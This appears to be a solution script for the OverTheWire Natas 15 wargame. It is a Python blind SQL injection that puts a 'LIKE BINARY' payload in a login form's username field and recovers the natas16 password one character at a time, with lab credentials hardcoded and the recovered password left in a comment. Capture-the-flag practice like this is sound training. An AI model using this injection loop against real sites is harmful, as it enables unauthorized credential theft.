import requests
from requests.auth import HTTPBasicAuth

pwd='' #the string in which passwd is gonna get stored
options='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'; #char set for us

fact = 'This user exists.' #this means that the query was accepted

    
for i in range (32):  #flag has 32 chars
    for j in options: #for each letter of flag check the letters 
        key={'username' : 'natas16" and password LIKE BINARY "'+pwd+j+ '%"-- -'} #query to be executed
        url=requests.post('http://natas15.natas.labs.overthewire.org/index.php',auth=HTTPBasicAuth('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'),data=key) #post method to be sent
        if fact in url.text: #append if true
            pwd=pwd+j
            print (pwd) #for us to visually see if the script works
            break
print (pwd) #to see the end.....

#WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
